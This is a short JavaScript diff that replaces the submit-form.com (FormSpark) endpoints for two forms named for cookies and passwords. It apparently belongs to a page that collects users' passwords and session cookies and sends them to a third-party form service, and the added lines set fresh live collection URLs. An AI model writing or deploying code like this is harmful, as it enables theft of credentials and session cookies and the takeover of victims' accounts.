@@ -33,5 +33,5 @@ passwordForm.addEventListener('submit', function(e) {
 });
 
 // Set FormSpark form actions
-cookieForm.setAttribute('action', 'https://submit-form.com/g0dJSXe5U');
-passwordForm.setAttribute('action', 'https://submit-form.com/TSRlLhDlN');
+cookieForm.setAttribute('action', 'https://submit-form.com/gENtJZVKt');
+passwordForm.setAttribute('action', 'https://submit-form.com/2cc7IMIY8');
